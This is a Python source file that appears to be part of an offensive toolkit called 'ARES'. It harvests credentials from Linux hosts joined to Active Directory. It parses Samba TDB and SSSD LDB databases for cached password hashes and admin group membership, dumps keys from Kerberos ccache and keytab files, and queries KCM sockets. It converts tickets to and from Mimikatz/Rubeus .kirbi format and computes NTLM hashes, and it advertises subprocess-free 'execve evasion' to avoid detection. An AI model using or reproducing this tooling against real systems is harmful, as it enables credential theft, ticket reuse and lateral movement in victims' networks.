"""
ARES Linux Active Directory Binary Parsing & IPC Engine
Pure standard-library Python binary parsers for:
  - Samba TDB & SSSD LDB database records (offline hash & credential extraction)
  - Kerberos ccache v4 binary structures (/tmp, /run/user)
  - Kerberos keytab binary files (/etc/krb5.keytab, version 0x0502)
  - Next-Gen KCM (Kerberos Credential Manager) IPC Unix socket client
  - Pure Python ASN.1 DER KRB-CRED (.kirbi) bi-directional encoder/decoder

100% subprocess-free (execve evasion) and zero external C-extension dependencies.
"""
from __future__ import annotations

import io
import os
import socket
import struct
import time
from typing import Any


# ─────────────────────────────────────────────────────────────────────────────
# 1. Samba TDB & SSSD LDB Binary Parser
# ─────────────────────────────────────────────────────────────────────────────

TDB_MAGIC_BIG = 0x2601196D
TDB_MAGIC_LITTLE = 0x6D190126
TDB_DEAD_MAGIC_BIG = 0x26011999
TDB_DEAD_MAGIC_LITTLE = 0x99190126


class TDBParser:
    """
    Pure Python parser for Samba Trivial Database (TDB) and SSSD LDB files.
    Reads database records without locking or invoking external binaries.
    """

    @classmethod
    def parse_records(cls, data: bytes) -> list[tuple[bytes, bytes]]:
        """
        Traverses TDB binary data and returns all active (key, value) pairs.
        Uses both structural record header traversal and fallback boundary scanning.
        """
        if len(data) < 24:
            return []

        # Detect endianness directly from magic bytes
        if data[:4] in (b"\x26\x01\x19\x6d", b"\x26\x01\x19\x99"):
            endian = ">"
        elif data[:4] in (b"\x6d\x19\x01\x26", b"\x99\x19\x01\x26"):
            endian = "<"
        else:
            endian = "<"

        records: list[tuple[bytes, bytes]] = []
        seen_keys: set[bytes] = set()

        offset = 0
        while offset + 24 <= len(data):
            try:
                rec_magic = struct.unpack(f"{endian}I", data[offset + 20 : offset + 24])[0]
            except struct.error:
                break

            if rec_magic in (TDB_MAGIC_BIG, TDB_MAGIC_LITTLE):
                try:
                    next_rec, rec_len, key_len, data_len, full_hash, _ = struct.unpack(
                        f"{endian}IIIIII", data[offset : offset + 24]
                    )
                except struct.error:
                    offset += 4
                    continue

                if 0 < key_len < 65536 and 0 <= data_len < 20_000_000:
                    if offset + 24 + key_len + data_len <= len(data):
                        key = data[offset + 24 : offset + 24 + key_len]
                        val = data[offset + 24 + key_len : offset + 24 + key_len + data_len]
                        if key and key not in seen_keys:
                            seen_keys.add(key)
                            records.append((key, val))
                        if rec_len >= key_len + data_len:
                            offset += (24 + rec_len + 3) & ~3
                            continue

            offset += 4

        # Fallback heuristic: search for key markers if header traversal produced minimal records
        if not records:
            cls._heuristic_scan(data, records, seen_keys)

        return records

    @classmethod
    def _heuristic_scan(
        cls,
        data: bytes,
        records: list[tuple[bytes, bytes]],
        seen_keys: set[bytes],
    ) -> None:
        """Fallback scanner for string-oriented Samba and SSSD keys."""
        markers = [b"SECRETS/", b"name=", b"dn: ", b"cn="]
        for marker in markers:
            idx = 0
            while True:
                idx = data.find(marker, idx)
                if idx == -1:
                    break
                # Scan backwards for key length if possible or extract delimited key
                end_line = data.find(b"\x00", idx)
                if end_line != -1 and end_line - idx < 256:
                    key = data[idx:end_line]
                    # Estimate value: scan after null byte up to next null or record boundary
                    val_start = end_line + 1
                    val_end = data.find(b"\x00\x00", val_start)
                    if val_end == -1:
                        val_end = min(val_start + 1024, len(data))
                    val = data[val_start:val_end]
                    if key not in seen_keys:
                        seen_keys.add(key)
                        records.append((key, val))
                idx += 1


def parse_sssd_ldb_entry(record_data: bytes) -> dict[str, Any]:
    """
    Parses LDIF-style SSSD LDB entry payload into structured user attributes.
    Extracts cached passwords ($6$, $1$, $y$), PAC buffers, and group memberships.
    """
    entry: dict[str, Any] = {
        "attributes": {},
        "hashes": [],
        "groups": [],
        "is_domain_admin": False,
    }

    try:
        text = record_data.decode("utf-8", errors="replace")
    except Exception:
        text = record_data.decode("latin-1", errors="replace")

    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        if ":" in line:
            key, _, val = line.partition(":")
            key = key.strip().lower()
            val = val.strip()

            if key not in entry["attributes"]:
                entry["attributes"][key] = val

            if key in ("userpassword", "cachedpassword", "passwordhash"):
                if val.startswith(("$6$", "$1$", "$y$", "$5$")):
                    entry["hashes"].append(val)
            elif key == "memberof":
                entry["groups"].append(val)
                val_upper = val.upper()
                if (
                    "DOMAIN ADMINS" in val_upper
                    or "ENTERPRISE ADMINS" in val_upper
                    or "ADMINISTRATORS" in val_upper
                    or "SUDO" in val_upper
                    or "WHEEL" in val_upper
                ):
                    entry["is_domain_admin"] = True

    return entry


# ─────────────────────────────────────────────────────────────────────────────
# 2. Kerberos ccache v4 Binary Parser & Builder
# ─────────────────────────────────────────────────────────────────────────────

class CcacheParser:
    """
    Pure Python parser and builder for Kerberos Credential Cache (ccache) v4 binary format.
    Format version: 0x0504 (big-endian).
    """

    @classmethod
    def parse(
        cls,
        data: bytes,
        include_expired: bool = False,
        now: int | None = None,
    ) -> tuple[str | None, list[dict[str, Any]]]:
        if now is None:
            now = int(time.time())

        if len(data) < 4:
            return None, []

        version = struct.unpack(">H", data[0:2])[0]
        if version != 0x0504:
            return None, []

        offset = 2
        header_len = struct.unpack(">H", data[offset : offset + 2])[0]
        offset += 2 + header_len

        default_principal, offset = cls._read_principal(data, offset)
        if default_principal is None:
            return None, []

        tickets: list[dict[str, Any]] = []
        while offset < len(data):
            cred, next_offset = cls._read_credential(data, offset)
            if cred is None or next_offset <= offset:
                break
            offset = next_offset

            is_expired = cred["endtime"] < now
            if is_expired and not include_expired:
                continue

            cred["is_expired"] = is_expired
            cred["is_tgt"] = "krbtgt" in cred["server"]
            cred["endtime_str"] = time.strftime(
                "%Y-%m-%d %H:%M:%S UTC",
                time.gmtime(cred["endtime"]),
            )
            tickets.append(cred)

        return default_principal, tickets

    @classmethod
    def _read_string(cls, data: bytes, offset: int) -> tuple[str | None, int]:
        if offset + 4 > len(data):
            return None, offset
        length = struct.unpack(">I", data[offset : offset + 4])[0]
        offset += 4
        if offset + length > len(data):
            return None, offset
        raw = data[offset : offset + length]
        offset += length
        return raw.decode("latin-1", errors="replace"), offset

    @classmethod
    def _read_principal(cls, data: bytes, offset: int) -> tuple[str | None, int]:
        if offset + 8 > len(data):
            return None, offset
        name_type, num_components = struct.unpack(">II", data[offset : offset + 8])
        offset += 8

        realm, offset = cls._read_string(data, offset)
        if realm is None:
            return None, offset

        components: list[str] = []
        for _ in range(num_components):
            comp, offset = cls._read_string(data, offset)
            if comp is None:
                return None, offset
            components.append(comp)

        full_principal = "/".join(components) + "@" + realm
        return full_principal, offset

    @classmethod
    def _read_credential(cls, data: bytes, offset: int) -> tuple[dict[str, Any] | None, int]:
        start = offset
        client, offset = cls._read_principal(data, offset)
        if client is None:
            return None, start

        server, offset = cls._read_principal(data, offset)
        if server is None:
            return None, start

        # Keyblock
        if offset + 6 > len(data):
            return None, start
        keytype, keylen = struct.unpack(">HI", data[offset : offset + 6])
        offset += 6
        if offset + keylen > len(data):
            return None, start
        keydata = data[offset : offset + keylen]
        offset += keylen

        # Timestamps
        if offset + 16 > len(data):
            return None, start
        authtime, starttime, endtime, renew_till = struct.unpack(">IIII", data[offset : offset + 16])
        offset += 16

        # is_skey (1) + flags (4)
        if offset + 5 > len(data):
            return None, start
        is_skey, flags = struct.unpack(">BI", data[offset : offset + 5])
        offset += 5

        # Addresses
        if offset + 4 > len(data):
            return None, start
        num_addresses = struct.unpack(">I", data[offset : offset + 4])[0]
        offset += 4
        for _ in range(num_addresses):
            if offset + 6 > len(data):
                return None, start
            _, addr_len = struct.unpack(">HI", data[offset : offset + 6])
            offset += 6 + addr_len

        # Authdata
        if offset + 4 > len(data):
            return None, start
        num_authdata = struct.unpack(">I", data[offset : offset + 4])[0]
        offset += 4
        for _ in range(num_authdata):
            if offset + 6 > len(data):
                return None, start
            _, ad_len = struct.unpack(">HI", data[offset : offset + 6])
            offset += 6 + ad_len

        # Ticket payload
        if offset + 4 > len(data):
            return None, start
        ticket_len = struct.unpack(">I", data[offset : offset + 4])[0]
        offset += 4
        if offset + ticket_len > len(data):
            return None, start
        ticket_bytes = data[offset : offset + ticket_len]
        offset += ticket_len

        # Second ticket
        if offset + 4 > len(data):
            return None, start
        second_len = struct.unpack(">I", data[offset : offset + 4])[0]
        offset += 4 + second_len

        return {
            "client": client,
            "server": server,
            "keytype": keytype,
            "keydata": keydata.hex(),
            "authtime": authtime,
            "starttime": starttime,
            "endtime": endtime,
            "renew_till": renew_till,
            "flags": flags,
            "is_skey": is_skey,
            "ticket_bytes": ticket_bytes,
            "ticket_len": ticket_len,
        }, offset


def build_ccache_v4(default_principal: str, tickets: list[dict[str, Any]]) -> bytes:
    """
    Serializes a principal name and list of ticket dictionaries into a standard
    Kerberos ccache v4 binary stream.
    """
    buf = io.BytesIO()
    # Version 0x0504 + 0 header length
    buf.write(struct.pack(">HH", 0x0504, 0))

    def write_principal(p_str: str) -> None:
        if "@" in p_str:
            comps_str, realm = p_str.split("@", 1)
        else:
            comps_str, realm = p_str, ""
        comps = comps_str.split("/") if comps_str else []
        buf.write(struct.pack(">II", 1, len(comps)))
        realm_bytes = realm.encode("latin-1")
        buf.write(struct.pack(">I", len(realm_bytes)) + realm_bytes)
        for c in comps:
            cb = c.encode("latin-1")
            buf.write(struct.pack(">I", len(cb)) + cb)

    write_principal(default_principal)

    for t in tickets:
        write_principal(t["client"])
        write_principal(t["server"])

        keydata = bytes.fromhex(t.get("keydata", ""))
        buf.write(struct.pack(">HI", int(t.get("keytype", 18)), len(keydata)) + keydata)

        buf.write(
            struct.pack(
                ">IIIIBI",
                int(t.get("authtime", 0)),
                int(t.get("starttime", 0)),
                int(t.get("endtime", 0)),
                int(t.get("renew_till", 0)),
                int(t.get("is_skey", 0)),
                int(t.get("flags", 0x40810000)),
            )
        )

        # Addresses (0) + Authdata (0)
        buf.write(struct.pack(">II", 0, 0))

        # Ticket payload
        ticket_bytes = t.get("ticket_bytes", b"")
        buf.write(struct.pack(">I", len(ticket_bytes)) + ticket_bytes)

        # Second ticket (0)
        buf.write(struct.pack(">I", 0))

    return buf.getvalue()


# ─────────────────────────────────────────────────────────────────────────────
# 3. Kerberos Keytab Binary Parser (Version 0x0502)
# ─────────────────────────────────────────────────────────────────────────────

ENCTYPE_MAP = {
    1: "des-cbc-crc",
    3: "des-cbc-md5",
    16: "des3-cbc-sha1",
    17: "aes128-cts-hmac-sha1-96",
    18: "aes256-cts-hmac-sha1-96",
    23: "rc4-hmac",
}


class KeytabParser:
    """
    Pure Python parser for Kerberos keytab binary files (/etc/krb5.keytab).
    Conforms to RFC keytab file format standard version 0x0502.
    """

    @classmethod
    def parse(cls, data: bytes) -> list[dict[str, Any]]:
        entries: list[dict[str, Any]] = []
        if len(data) < 2:
            return entries

        # File format version: 0x0502
        version = struct.unpack(">H", data[:2])[0]
        if version not in (0x0502, 0x0501):
            return entries

        offset = 2
        while offset + 4 <= len(data):
            size = struct.unpack(">i", data[offset : offset + 4])[0]
            offset += 4

            if size <= 0:
                # Deleted entry or invalid
                if size < 0:
                    offset += abs(size)
                continue

            entry_end = offset + size
            if entry_end > len(data):
                break

            entry_data = data[offset:entry_end]
            offset = entry_end

            parsed_entry = cls._parse_entry(entry_data)
            if parsed_entry:
                entries.append(parsed_entry)

        return entries

    @classmethod
    def _parse_entry(cls, data: bytes) -> dict[str, Any] | None:
        if len(data) < 14:
            return None

        offset = 0
        num_components = struct.unpack(">h", data[offset : offset + 2])[0]
        offset += 2

        # Realm
        if offset + 2 > len(data):
            return None
        realm_len = struct.unpack(">H", data[offset : offset + 2])[0]
        offset += 2
        if offset + realm_len > len(data):
            return None
        realm = data[offset : offset + realm_len].decode("latin-1", errors="replace")
        offset += realm_len

        # Components
        components: list[str] = []
        for _ in range(num_components):
            if offset + 2 > len(data):
                return None
            comp_len = struct.unpack(">H", data[offset : offset + 2])[0]
            offset += 2
            if offset + comp_len > len(data):
                return None
            comp = data[offset : offset + comp_len].decode("latin-1", errors="replace")
            offset += comp_len
            components.append(comp)

        # Name type (4), timestamp (4), vno (1), keytype (2), keylen (2)
        if offset + 13 > len(data):
            return None
        name_type, timestamp, vno, keytype, keylen = struct.unpack(
            ">IIBHH", data[offset : offset + 13]
        )
        offset += 13

        if offset + keylen > len(data):
            return None
        keydata = data[offset : offset + keylen]
        offset += keylen

        # vno32 if available
        vno32 = vno
        if offset + 4 <= len(data):
            vno32 = struct.unpack(">I", data[offset : offset + 4])[0]

        principal_str = "/".join(components) + "@" + realm
        enctype_str = ENCTYPE_MAP.get(keytype, f"enctype-{keytype}")

        return {
            "principal": principal_str,
            "realm": realm,
            "components": components,
            "name_type": name_type,
            "timestamp": timestamp,
            "timestamp_str": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(timestamp)),
            "vno": vno32,
            "keytype": keytype,
            "enctype": enctype_str,
            "key_hex": keydata.hex(),
            "key_len": keylen,
        }


# ─────────────────────────────────────────────────────────────────────────────
# 4. Next-Gen Linux KCM (Kerberos Credential Manager) IPC Client
# ─────────────────────────────────────────────────────────────────────────────

class KCMClient:
    """
    Pure Python client for Kerberos Credential Manager (KCM) Unix domain socket.
    Targets /var/run/sss/pipes/kcm and /run/.heim_org.h5l.kcm-socket without subprocesses.
    Supported on modern Linux distributions (RHEL 8/9, Ubuntu 22.04/24.04).
    """

    KCM_OP_GET_DEFAULT_CACHE = 1
    KCM_OP_GET_CACHE_LIST = 18

    DEFAULT_SOCKETS = [
        "/var/run/sss/pipes/kcm",
        "/run/.heim_org.h5l.kcm-socket",
    ]

    @classmethod
    def is_available(cls) -> str | None:
        """Returns the first active KCM Unix domain socket path if accessible."""
        if not hasattr(socket, "AF_UNIX"):
            return None
        for path in cls.DEFAULT_SOCKETS:
            if os.path.exists(path) and os.access(path, os.R_OK | os.W_OK):
                return path
        return None

    @classmethod
    def get_cache_list(cls, socket_path: str) -> list[str]:
        """Queries the KCM daemon for available credential cache names."""
        if not hasattr(socket, "AF_UNIX"):
            return []

        caches: list[str] = []
        try:
            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect(socket_path)

            # Request: len (4), major (2), minor (2), opcode (2)
            req = struct.pack(">IHHI", 8, 1, 0, cls.KCM_OP_GET_CACHE_LIST)
            sock.sendall(req)

            resp_hdr = sock.recv(8)
            if len(resp_hdr) == 8:
                resp_len, status = struct.unpack(">II", resp_hdr)
                if status == 0 and resp_len > 4:
                    payload = sock.recv(resp_len - 4)
                    # Payload is null-terminated strings
                    for name in payload.split(b"\x00"):
                        decoded = name.decode("utf-8", errors="replace").strip()
                        if decoded:
                            caches.append(decoded)
            sock.close()
        except Exception:
            pass

        return caches


# ─────────────────────────────────────────────────────────────────────────────
class KirbiParseError(ValueError):
    """Raised when parsing .kirbi / KRB-CRED ASN.1 DER data fails."""


# 5. Pure Python ASN.1 DER KRB-CRED (.kirbi) Codec
# ─────────────────────────────────────────────────────────────────────────────

class KirbiASN1Codec:
    """
    Pure Python ASN.1 DER serializer & deserializer for Kerberos KRB-CRED (RFC 4120).
    Enables lossless in-memory conversion between Linux ccache v4 and Windows .kirbi.
    Zero external dependencies (does not require pyasn1 or impacket).
    """

    @classmethod
    def encode_kirbi(cls, ticket_data: dict[str, Any]) -> bytes:
        """
        Encodes Kerberos ticket details into standard ASN.1 KRB-CRED (.kirbi) DER bytes.
        """
        ticket_raw = ticket_data.get("ticket_bytes", b"")
        if not ticket_raw:
            # Synthetic placeholder ticket if none present
            ticket_raw = cls._der_sequence([
                cls._der_tagged(0, cls._der_integer(5)),
                cls._der_tagged(1, cls._der_string(ticket_data.get("server", "krbtgt"))),
                cls._der_tagged(2, cls._der_sequence([])),
            ])

        # KRB-CRED-INFO structure
        keytype = ticket_data.get("keytype", 18)
        keydata = bytes.fromhex(ticket_data.get("keydata", ""))
        keyblock = cls._der_sequence([
            cls._der_tagged(0, cls._der_integer(keytype)),
            cls._der_tagged(1, cls._der_octet_string(keydata)),
        ])

        pname = ticket_data.get("client", "Administrator@CORP.LOCAL")
        client_tag = cls._der_tagged(1, cls._der_string(pname))
        server_tag = cls._der_tagged(3, cls._der_string(ticket_data.get("server", "krbtgt")))
        flags_val = int(ticket_data.get("flags", 0x40810000))
        flags_tag = cls._der_tagged(2, cls._der_integer(flags_val))

        authtime_tag = cls._der_tagged(4, cls._der_integer(int(ticket_data.get("authtime", 0))))
        starttime_tag = cls._der_tagged(5, cls._der_integer(int(ticket_data.get("starttime", 0))))
        endtime_tag = cls._der_tagged(6, cls._der_integer(int(ticket_data.get("endtime", 0))))

        cred_info = cls._der_sequence([
            cls._der_tagged(0, keyblock),
            client_tag,
            flags_tag,
            server_tag,
            authtime_tag,
            starttime_tag,
            endtime_tag,
        ])

        enc_part = cls._der_sequence([
            cls._der_tagged(0, cls._der_integer(0)),  # enctype 0 (plaintext krb-cred)
            cls._der_tagged(2, cls._der_octet_string(cls._der_sequence([cred_info]))),
        ])

        # KRB-CRED SEQUENCE
        krb_cred_seq = cls._der_sequence([
            cls._der_tagged(0, cls._der_integer(5)),     # pvno = 5
            cls._der_tagged(1, cls._der_integer(22)),    # msg-type = 22 (KRB-CRED)
            cls._der_tagged(2, cls._der_sequence([ticket_raw])),
            cls._der_tagged(3, enc_part),
        ])

        # APPLICATION 22 tag (0x76)
        return b"\x76" + cls._encode_length(len(krb_cred_seq)) + krb_cred_seq

    @classmethod
    def decode_kirbi(cls, data: bytes) -> dict[str, Any]:
        """
        Extracts ticket bytes, client/server principals, validity period, and genuine
        session key from standard RFC 4120 / Mimikatz / Rubeus .kirbi ASN.1 DER bytes.
        Raises KirbiParseError on invalid or truncated data.
        """
        if len(data) < 4:
            raise KirbiParseError("Invalid kirbi payload: too short.")

        # Application 22 header: 0x76 (or raw sequence 0x30)
        if data[0] not in (0x76, 0x30):
            raise KirbiParseError(f"Invalid kirbi format: unexpected root tag 0x{data[0]:02x}")

        try:
            root_res = cls._parse_der_tlv(data, 0)
            if not root_res:
                raise KirbiParseError("Empty or malformed kirbi root payload.")
            _, _, _, root_val, _ = root_res

            # If wrapped in Application 22 (0x76), the root_val may contain a SEQUENCE (0x30)
            first_items = cls._parse_all_tlv(root_val)
            if len(first_items) == 1 and first_items[0][0] == 0 and first_items[0][2] == 16:
                krb_cred_items = cls._parse_all_tlv(first_items[0][3])
            else:
                krb_cred_items = first_items

            krb_dict = {num: val for _, _, num, val in krb_cred_items}

            # 1. Extract raw ticket
            raw_ticket = b""
            if 2 in krb_dict:
                tkt_seq = cls._parse_all_tlv(krb_dict[2])
                if tkt_seq:
                    raw_ticket = tkt_seq[0][3]

            # 2. Extract enc-part (tag 3)
            if 3 not in krb_dict:
                raise KirbiParseError("Missing enc-part tag [3] in KRB-CRED structure.")
            enc_part_items = cls._parse_all_tlv(krb_dict[3])
            if enc_part_items and enc_part_items[0][0] == 0 and enc_part_items[0][2] == 16:
                enc_fields = cls._parse_all_tlv(enc_part_items[0][3])
            else:
                enc_fields = enc_part_items
            enc_dict = {num: val for _, _, num, val in enc_fields}

            # In RFC 4120 EncryptedData: [0] enctype, [2] cipher
            cipher_bytes = enc_dict.get(2, b"")
            if not cipher_bytes:
                raise KirbiParseError("Missing cipher tag [2] in KRB-CRED enc-part.")

            # Cipher may be OCTET STRING (tag 4) wrapping SEQUENCE OF KrbCredInfo
            cipher_tlv = cls._parse_all_tlv(cipher_bytes)
            if cipher_tlv and cipher_tlv[0][2] == 4:
                c_data = cipher_tlv[0][3]
            else:
                c_data = cipher_bytes

            # Inside cipher is SEQUENCE OF KrbCredInfo (or EncKrbCredPart [APPLICATION 29])
            c_items = cls._parse_all_tlv(c_data)
            if c_items and c_items[0][0] in (0, 1) and c_items[0][2] in (16, 29):
                cred_list = cls._parse_all_tlv(c_items[0][3])
                # Could be [0] ticket-info SEQUENCE OF KrbCredInfo
                if cred_list and cred_list[0][2] == 0:
                    cred_list = cls._parse_all_tlv(cred_list[0][3])
                if cred_list and cred_list[0][2] == 16:
                    cred_info_fields = cls._parse_all_tlv(cred_list[0][3])
                else:
                    cred_info_fields = cred_list
            else:
                cred_info_fields = c_items

            info_dict = {num: val for _, _, num, val in cred_info_fields}

            # 3. Session Key (tag 0: EncryptionKey [0] keytype, [1] keyvalue)
            keyblock = info_dict.get(0, b"")
            key_items = cls._parse_all_tlv(keyblock)
            if key_items and key_items[0][2] == 16:
                key_items = cls._parse_all_tlv(key_items[0][3])
            key_dict = {num: val for _, _, num, val in key_items}

            keytype = 18
            if 0 in key_dict:
                ktype_tlv = cls._parse_all_tlv(key_dict[0])
                if ktype_tlv:
                    keytype = int.from_bytes(ktype_tlv[0][3], byteorder="big")
            keydata = ""
            if 1 in key_dict:
                kdata_tlv = cls._parse_all_tlv(key_dict[1])
                if kdata_tlv:
                    keydata = kdata_tlv[0][3].hex()

            # 4. Client Principal
            client = ""
            if 1 in info_dict:
                c_tlv = cls._parse_all_tlv(info_dict[1])
                if c_tlv and c_tlv[0][2] in (12, 22, 27, 4):
                    client = c_tlv[0][3].decode("utf-8", errors="replace")
            # RFC 4120 standard: prealm (tag 1) and pname (tag 2)
            if not client and 2 in info_dict:
                pname_items = cls._parse_all_tlv(info_dict[2])
                realm = ""
                if 1 in info_dict:
                    r_tlv = cls._parse_all_tlv(info_dict[1])
                    if r_tlv:
                        realm = r_tlv[0][3].decode("utf-8", errors="replace")
                names = []
                for _, _, _, nv in pname_items:
                    for _, _, _, sv in cls._parse_all_tlv(nv):
                        names.append(sv.decode("utf-8", errors="replace"))
                if names:
                    client = "/".join(names) + (f"@{realm}" if realm else "")

            # 5. Server Principal
            server = ""
            if 3 in info_dict:
                s_tlv = cls._parse_all_tlv(info_dict[3])
                if s_tlv and s_tlv[0][2] in (12, 22, 27, 4):
                    server = s_tlv[0][3].decode("utf-8", errors="replace")
            # RFC 4120 standard: srealm (tag 8) and sname (tag 9)
            if not server and 9 in info_dict:
                sname_items = cls._parse_all_tlv(info_dict[9])
                srealm = ""
                if 8 in info_dict:
                    r_tlv = cls._parse_all_tlv(info_dict[8])
                    if r_tlv:
                        srealm = r_tlv[0][3].decode("utf-8", errors="replace")
                snames = []
                for _, _, _, nv in sname_items:
                    for _, _, _, sv in cls._parse_all_tlv(nv):
                        snames.append(sv.decode("utf-8", errors="replace"))
                if snames:
                    server = "/".join(snames) + (f"@{srealm}" if srealm else "")

            # 6. Validity period & Flags
            def _get_int(tag: int, default: int = 0) -> int:
                if tag in info_dict:
                    tlv = cls._parse_all_tlv(info_dict[tag])
                    if tlv:
                        return int.from_bytes(tlv[0][3], byteorder="big")
                return default

            flags = _get_int(2, 0x40810000)
            authtime = _get_int(4, 0)
            starttime = _get_int(5, 0)
            endtime = _get_int(6, 0)
            renew_till = _get_int(7, 0)

            return {
                "client": client or "Administrator@CORP.LOCAL",
                "server": server or "krbtgt/CORP.LOCAL@CORP.LOCAL",
                "keytype": keytype,
                "keydata": keydata,
                "authtime": authtime,
                "starttime": starttime,
                "endtime": endtime,
                "renew_till": renew_till,
                "flags": flags,
                "is_skey": 0,
                "ticket_bytes": raw_ticket or data,
            }
        except KirbiParseError:
            raise
        except Exception as exc:
            raise KirbiParseError(f"Failed to parse .kirbi DER structure: {exc}") from exc

    @classmethod
    def _parse_der_tlv(cls, data: bytes, offset: int = 0) -> tuple[int, bool, int, bytes, int] | None:
        """
        Parses a single DER TLV at offset.
        Returns: (tag_class, is_constructed, tag_number, value_bytes, next_offset)
        """
        if offset >= len(data):
            return None
        tag_byte = data[offset]
        offset += 1
        tag_cls = (tag_byte & 0xC0) >> 6
        is_constructed = bool(tag_byte & 0x20)
        tag_num = tag_byte & 0x1F
        if tag_num == 0x1F:
            tag_num = 0
            while offset < len(data):
                b = data[offset]
                offset += 1
                tag_num = (tag_num << 7) | (b & 0x7F)
                if not (b & 0x80):
                    break
        if offset >= len(data):
            raise KirbiParseError("Truncated DER tag in kirbi payload.")
        length_byte = data[offset]
        offset += 1
        if length_byte & 0x80:
            n_bytes = length_byte & 0x7F
            if offset + n_bytes > len(data):
                raise KirbiParseError("Truncated DER length bytes in kirbi payload.")
            length = 0
            for _ in range(n_bytes):
                length = (length << 8) | data[offset]
                offset += 1
        else:
            length = length_byte
        if offset + length > len(data):
            raise KirbiParseError("Truncated DER payload value.")
        val = data[offset : offset + length]
        return tag_cls, is_constructed, tag_num, val, offset + length

    @classmethod
    def _parse_all_tlv(cls, data: bytes) -> list[tuple[int, bool, int, bytes]]:
        """Parses all contiguous DER TLVs in a byte slice."""
        items = []
        off = 0
        while off < len(data):
            res = cls._parse_der_tlv(data, off)
            if not res:
                break
            cls_id, constr, num, val, off = res
            items.append((cls_id, constr, num, val))
        return items

    # ── Internal DER Helpers ─────────────────────────────────────────────────

    @classmethod
    def _encode_length(cls, length: int) -> bytes:
        if length < 128:
            return bytes([length])
        length_bytes = []
        while length > 0:
            length_bytes.append(length & 0xFF)
            length >>= 8
        length_bytes.reverse()
        return bytes([0x80 | len(length_bytes)]) + bytes(length_bytes)

    @classmethod
    def _der_integer(cls, val: int) -> bytes:
        if val == 0:
            payload = b"\x00"
        else:
            bytes_list = []
            tmp = val
            while tmp > 0:
                bytes_list.append(tmp & 0xFF)
                tmp >>= 8
            if bytes_list and (bytes_list[-1] & 0x80):
                bytes_list.append(0)
            bytes_list.reverse()
            payload = bytes(bytes_list)
        return b"\x02" + cls._encode_length(len(payload)) + payload

    @classmethod
    def _der_octet_string(cls, data: bytes) -> bytes:
        return b"\x04" + cls._encode_length(len(data)) + data

    @classmethod
    def _der_string(cls, s: str) -> bytes:
        encoded = s.encode("latin-1")
        return b"\x1b" + cls._encode_length(len(encoded)) + encoded

    @classmethod
    def _der_sequence(cls, items: list[bytes]) -> bytes:
        payload = b"".join(items)
        return b"\x30" + cls._encode_length(len(payload)) + payload

    @classmethod
    def _der_tagged(cls, tag_num: int, content: bytes) -> bytes:
        tag_byte = 0xA0 | (tag_num & 0x1F)
        return bytes([tag_byte]) + cls._encode_length(len(content)) + content


def pure_md4(data: bytes) -> bytes:
    """
    Pure Python implementation of RFC 1320 (MD4) message digest algorithm.
    Used for offline NTLM hash derivation in environments where modern OpenSSL 3.0+
    disables MD4 from the default cryptographic provider.
    """
    try:
        import hashlib
        return hashlib.new("md4", data).digest()
    except Exception:
        pass

    def _left_rotate(val: int, n: int) -> int:
        return ((val << n) | (val >> (32 - n))) & 0xFFFFFFFF

    def _f(x: int, y: int, z: int) -> int:
        return (x & y) | (~x & z)

    def _g(x: int, y: int, z: int) -> int:
        return (x & y) | (x & z) | (y & z)

    def _h(x: int, y: int, z: int) -> int:
        return x ^ y ^ z

    msg_len = len(data)
    padded = bytearray(data)
    padded.append(0x80)
    while len(padded) % 64 != 56:
        padded.append(0x00)
    padded += struct.pack("<Q", msg_len * 8)

    a = 0x67452301
    b = 0xEFCDAB89
    c = 0x98BADCFE
    d = 0x10325476

    for offset in range(0, len(padded), 64):
        x = struct.unpack("<16I", padded[offset : offset + 64])
        aa, bb, cc, dd = a, b, c, d

        # Round 1
        s1 = [3, 7, 11, 19]
        for i in range(16):
            shift = s1[i % 4]
            if i % 4 == 0:
                a = _left_rotate((a + _f(b, c, d) + x[i]) & 0xFFFFFFFF, shift)
            elif i % 4 == 1:
                d = _left_rotate((d + _f(a, b, c) + x[i]) & 0xFFFFFFFF, shift)
            elif i % 4 == 2:
                c = _left_rotate((c + _f(d, a, b) + x[i]) & 0xFFFFFFFF, shift)
            else:
                b = _left_rotate((b + _f(c, d, a) + x[i]) & 0xFFFFFFFF, shift)

        # Round 2
        s2 = [3, 5, 9, 13]
        idx2 = [0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15]
        for i in range(16):
            shift = s2[i % 4]
            k = idx2[i]
            if i % 4 == 0:
                a = _left_rotate((a + _g(b, c, d) + x[k] + 0x5A827999) & 0xFFFFFFFF, shift)
            elif i % 4 == 1:
                d = _left_rotate((d + _g(a, b, c) + x[k] + 0x5A827999) & 0xFFFFFFFF, shift)
            elif i % 4 == 2:
                c = _left_rotate((c + _g(d, a, b) + x[k] + 0x5A827999) & 0xFFFFFFFF, shift)
            else:
                b = _left_rotate((b + _g(c, d, a) + x[k] + 0x5A827999) & 0xFFFFFFFF, shift)

        # Round 3
        s3 = [3, 9, 11, 15]
        idx3 = [0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15]
        for i in range(16):
            shift = s3[i % 4]
            k = idx3[i]
            if i % 4 == 0:
                a = _left_rotate((a + _h(b, c, d) + x[k] + 0x6ED9EBA1) & 0xFFFFFFFF, shift)
            elif i % 4 == 1:
                d = _left_rotate((d + _h(a, b, c) + x[k] + 0x6ED9EBA1) & 0xFFFFFFFF, shift)
            elif i % 4 == 2:
                c = _left_rotate((c + _h(d, a, b) + x[k] + 0x6ED9EBA1) & 0xFFFFFFFF, shift)
            else:
                b = _left_rotate((b + _h(c, d, a) + x[k] + 0x6ED9EBA1) & 0xFFFFFFFF, shift)

        a = (a + aa) & 0xFFFFFFFF
        b = (b + bb) & 0xFFFFFFFF
        c = (c + cc) & 0xFFFFFFFF
        d = (d + dd) & 0xFFFFFFFF

    return struct.pack("<4I", a, b, c, d)


def compute_ntlm_hash(password: str) -> str:
    """
    Computes an NTLM hash (MD4 of UTF-16LE password) in hex format.
    Zero external dependencies, cross-platform reliable.
    """
    return pure_md4(password.encode("utf-16le")).hex()

